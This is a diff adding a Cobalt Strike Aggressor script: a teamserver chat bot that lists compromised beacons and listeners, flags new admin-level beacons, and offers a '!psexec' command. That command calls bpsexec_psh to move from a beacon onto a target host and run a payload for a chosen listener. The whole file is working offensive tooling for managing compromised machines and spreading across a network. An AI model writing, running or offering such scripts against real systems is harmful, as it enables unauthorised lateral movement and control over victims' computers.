@@ -1,0 +1,74 @@
+# This is a bot for Cobalt Strike!
+# Features:
+# - Welcome users to your teamserver
+# - Play ping pong
+# - List beacons by ID
+# - List listeners
+# - PsExec from the event log
+
+sub psexecTarget {
+    ($bid, $target, $listener) = @_; # @_ contains the arguments for the subroutine.
+    say("Owning $target with psexec_psh.");
+    bpsexec_psh($bid, $target, $listener);
+}
+
+on event_join {
+    elog("User \c9$1\c7 joined! Welcome to the teamserver.");
+}
+
+on event_public {
+    if (substr($2, 0, 1) eq "!") {
+        @input = split(" ", $2); # Split incoming command on spaces
+        $cmd = @input[0]; # Command is !<cmd> arg1 arg2...
+        @args = sublist(@input, 1); # sublist gets everything after !cmd
+
+        # Log to script console for debug purposes
+        println("Command received: $cmd");
+        println("Arguments: " . @args);
+
+        if ($cmd eq "!ping") {
+            say("pong!");
+        }
+        # List all beacons by ID
+        else if ($cmd eq "!beacons") {
+            foreach $b (beacons()) {
+                say("Beacon: $b['id'] on $b['computer'] as $b['user']");
+            }
+        }
+        # List all listeners
+        else if ($cmd eq "!listeners") {
+            foreach $l (listeners()) {
+                say("Listener: $l");
+            }
+        }
+        # psexec to target host from beacon
+        else if ($cmd eq "!psexec") {
+            if (size(@args) == 3) {
+                $bid      = @args[0];
+                $target   = @args[1];
+                $listener = @args[2];
+
+                # Log to script console for debug purposes
+                println("Beacon ID: $bid");
+                println("Target: $target");
+                println("Listener: $listener");
+
+                psexecTarget($bid, $target, $listener);
+            }
+        }
+    }
+}
+
+on beacon_initial {
+    # If incoming beacon is admin, call it out in event log
+    if (-isadmin $1) {
+        # $1 for beacon_initial event is beacon ID, have to get metadata with bdata($1)
+        $b = bdata($1);
+        say("\c5New admin beacon: \c2" . $b['user'] . "@" . $b['computer'] . "\c5!");
+    }
+}
+
+# Log all beacon tasks to event log for debugging purposes
+on beacon_tasked {
+    elog("Beacon $1 tasked: $2");
+}
